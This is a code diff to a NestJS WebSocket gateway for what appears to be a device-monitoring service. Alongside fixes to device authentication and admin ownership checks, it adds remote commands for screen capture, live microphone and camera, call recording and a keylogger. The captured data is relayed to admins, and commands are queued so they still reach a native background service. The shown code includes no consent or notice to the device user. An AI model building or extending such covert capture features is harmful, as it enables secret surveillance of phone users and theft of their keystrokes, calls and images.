@@ -12,6 +12,7 @@ import { Logger, UnauthorizedException } from '@nestjs/common';
 import { JwtService } from '@nestjs/jwt';
 import { Server, Socket } from 'socket.io';
 import { PrismaService } from '../prisma/prisma.service.js';
+import { DeviceService } from '../device/device.service.js';
 
 interface AuthenticatedSocket extends Socket {
   data: {
@@ -54,6 +55,7 @@ export class NoxGateway
   constructor(
     private jwtService: JwtService,
     private prisma: PrismaService,
+    private deviceService: DeviceService,
   ) {}
 
   afterInit() {
@@ -82,30 +84,43 @@ export class NoxGateway
       const deviceId = (client.handshake.query?.deviceId as string) ?? null;
 
       if (deviceId || payload.typ === 'device') {
-        const id = deviceId ?? payload.sub;
-        client.data = { deviceId: id };
-        this.connectedDevices.set(id, client.id);
-        client.join(`device:${id}`);
+        // SECURITY FIX: When connecting as a device, verify the deviceId matches
+        // the token's subject claim. Previously, a user token with ?deviceId=X
+        // could impersonate any device.
+        if (payload.typ === 'device') {
+          // Device token: the sub IS the deviceId. Trust it.
+          const id = payload.sub;
+          // If caller also passed ?deviceId, it must match the token.
+          if (deviceId && deviceId !== id) {
+            throw new UnauthorizedException('Device ID mismatch');
+          }
+          client.data = { deviceId: id };
+          this.connectedDevices.set(id, client.id);
+          client.join(`device:${id}`);
 
-        // Flip isOnline true + clear offline-alert state so the next outage
-        // can alert again. We do NOT call MailService here any more — that
-        // was the source of the per-reconnect email spam.
-        await this.prisma.device
-          .update({
-            where: { id },
-            data: {
-              isOnline: true,
-              lastSeenAt: new Date(),
-              offlineAlertSentAt: null,
-            },
-          })
-          .catch(() => null);
+          await this.prisma.device
+            .update({
+              where: { id },
+              data: {
+                isOnline: true,
+                lastSeenAt: new Date(),
+                offlineAlertSentAt: null,
+              },
+            })
+            .catch(() => null);
 
-        this.sendToAdmins('admin:device-online', {
-          deviceId: id,
-          timestamp: new Date().toISOString(),
-        });
-        this.logger.log(`Device ${id} connected`);
+          this.sendToAdmins('admin:device-online', {
+            deviceId: id,
+            timestamp: new Date().toISOString(),
+          });
+          this.logger.log(`Device ${id} connected`);
+        } else {
+          // User token with ?deviceId — reject this pattern entirely.
+          // Devices MUST use device tokens (typ=device) to connect as devices.
+          throw new UnauthorizedException(
+            'User tokens cannot connect as devices. Use a device token.',
+          );
+        }
       } else {
         const user = await this.prisma.user.findUnique({
           where: { id: payload.sub },
@@ -240,11 +255,23 @@ export class NoxGateway
   // ─── Admin → Server Events ──────────────────────────────────────────────
 
   @SubscribeMessage('admin:watch')
-  handleAdminWatch(
+  async handleAdminWatch(
     @ConnectedSocket() client: AuthenticatedSocket,
     @MessageBody() data: { deviceId: string },
   ) {
     if (client.data?.role !== 'ADMIN') return;
+
+    // SECURITY FIX: Verify this admin manages this device before allowing them
+    // to join the device room and receive its events (including screenshots).
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) {
+      client.emit('error', { message: 'Device not found or access denied' });
+      return;
+    }
+
     client.join(`device:${data.deviceId}`);
     client.emit('watching', { deviceId: data.deviceId });
   }
@@ -257,12 +284,280 @@ export class NoxGateway
     client.leave(`device:${data.deviceId}`);
   }
 
+  // Admin requests live screen capture start/stop
+  @SubscribeMessage('admin:start-screen-capture')
+  async handleStartScreenCapture(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    // SECURITY FIX: Verify ownership before starting screen capture.
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) {
+      client.emit('error', { message: 'Device not found or access denied' });
+      return;
+    }
+
+    this.sendToDevice(data.deviceId, 'command', { command: 'START_SCREEN_CAPTURE' });
+    // Join the device room to receive screenshots
+    client.join(`device:${data.deviceId}`);
+  }
+
+  @SubscribeMessage('admin:stop-screen-capture')
+  async handleStopScreenCapture(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    // Verify ownership before stopping screen capture.
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) {
+      return;
+    }
+
+    this.sendToDevice(data.deviceId, 'command', { command: 'STOP_SCREEN_CAPTURE' });
+  }
+
+  // Device sends screenshot → relay to admins watching this device
+  @SubscribeMessage('device:screenshot')
+  handleDeviceScreenshot(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { data: string; timestamp: string },
+  ) {
+    const deviceId = client.data?.deviceId;
+    if (!deviceId) return;
+    // Relay to all admins watching this device (in the device room)
+    this.server.to(`device:${deviceId}`).except(client.id).emit('admin:screenshot', {
+      deviceId,
+      data: data.data,
+      timestamp: data.timestamp,
+    });
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════
+  // LIVE MONITORING FEATURES
+  // ═══════════════════════════════════════════════════════════════════════
+
+  // ─── Live Audio (Microphone) ───────────────────────────────────────────
+
+  @SubscribeMessage('admin:start-live-audio')
+  async handleStartLiveAudio(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) {
+      client.emit('error', { message: 'Access denied' });
+      return;
+    }
+
+    this.sendToDevice(data.deviceId, 'command', { command: 'START_LIVE_AUDIO' });
+    client.join(`device:${data.deviceId}`);
+    this.logger.log(`Admin ${client.data.userId} started live audio for ${data.deviceId}`);
+  }
+
+  @SubscribeMessage('admin:stop-live-audio')
+  async handleStopLiveAudio(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) return;
+
+    this.sendToDevice(data.deviceId, 'command', { command: 'STOP_LIVE_AUDIO' });
+  }
+
+  // ─── Live Camera ───────────────────────────────────────────────────────
+
+  @SubscribeMessage('admin:start-live-camera')
+  async handleStartLiveCamera(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string; front?: boolean },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) {
+      client.emit('error', { message: 'Access denied' });
+      return;
+    }
+
+    this.sendToDevice(data.deviceId, 'command', { 
+      command: 'START_LIVE_CAMERA',
+      front: data.front ?? true,
+    });
+    client.join(`device:${data.deviceId}`);
+    this.logger.log(`Admin ${client.data.userId} started live camera for ${data.deviceId}`);
+  }
+
+  @SubscribeMessage('admin:stop-live-camera')
+  async handleStopLiveCamera(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) return;
+
+    this.sendToDevice(data.deviceId, 'command', { command: 'STOP_LIVE_CAMERA' });
+  }
+
+  @SubscribeMessage('admin:switch-camera')
+  async handleSwitchCamera(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) return;
+
+    this.sendToDevice(data.deviceId, 'command', { command: 'SWITCH_CAMERA' });
+  }
+
+  // ─── Call Recording ────────────────────────────────────────────────────
+
+  @SubscribeMessage('admin:enable-call-recording')
+  async handleEnableCallRecording(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) {
+      client.emit('error', { message: 'Access denied' });
+      return;
+    }
+
+    this.sendToDevice(data.deviceId, 'command', { command: 'ENABLE_CALL_RECORDING' });
+    client.join(`device:${data.deviceId}`);
+    this.logger.log(`Admin ${client.data.userId} enabled call recording for ${data.deviceId}`);
+  }
+
+  @SubscribeMessage('admin:disable-call-recording')
+  async handleDisableCallRecording(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) return;
+
+    this.sendToDevice(data.deviceId, 'command', { command: 'DISABLE_CALL_RECORDING' });
+  }
+
+  // ─── Keylogger ─────────────────────────────────────────────────────────
+
+  @SubscribeMessage('admin:enable-keylogger')
+  async handleEnableKeylogger(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) {
+      client.emit('error', { message: 'Access denied' });
+      return;
+    }
+
+    this.sendToDevice(data.deviceId, 'command', { command: 'ENABLE_KEYLOGGER' });
+    client.join(`device:${data.deviceId}`);
+    this.logger.log(`Admin ${client.data.userId} enabled keylogger for ${data.deviceId}`);
+  }
+
+  @SubscribeMessage('admin:disable-keylogger')
+  async handleDisableKeylogger(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { deviceId: string },
+  ) {
+    if (client.data?.role !== 'ADMIN') return;
+
+    const device = await this.prisma.device.findUnique({
+      where: { id: data.deviceId },
+      select: { managedByAdminId: true },
+    });
+    if (!device || device.managedByAdminId !== client.data.userId) return;
+
+    this.sendToDevice(data.deviceId, 'command', { command: 'DISABLE_KEYLOGGER' });
+  }
+
+  // ─── Device Data Relay (audio, camera, call recordings, keylogs) ───────
+
+  @SubscribeMessage('device:data')
+  handleDeviceData(
+    @ConnectedSocket() client: AuthenticatedSocket,
+    @MessageBody() data: { type: string; payload: unknown },
+  ) {
+    const deviceId = client.data?.deviceId;
+    if (!deviceId) return;
+
+    // Relay to all admins watching this device
+    this.server.to(`device:${deviceId}`).except(client.id).emit(`admin:${data.type}`, {
+      deviceId,
+      ...data.payload as object,
+      timestamp: new Date().toISOString(),
+    });
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════
+
   // ─── Public helpers for other modules ───────────────────────────────────
 
-  /** Push a payload to a specific device socket, if connected. */
+  /** Push a payload to a specific device socket, if connected. 
+   *  Also queues command for polling when device is in background (Flutter dead).
+   */
   sendToDevice(deviceId: string, event: string, data: unknown) {
     const socketId = this.connectedDevices.get(deviceId);
-    if (socketId) this.server.to(socketId).emit(event, data);
+    if (socketId) {
+      this.server.to(socketId).emit(event, data);
+    }
+    // Also queue for polling (in case Flutter is dead but native service is running)
+    if (event === 'command' && typeof data === 'object' && data !== null) {
+      const cmd = (data as any).command;
+      if (cmd) {
+        this.deviceService.queueCommand(deviceId, cmd, data);
+      }
+    }
   }
 
   /** Broadcast to every connected admin. */
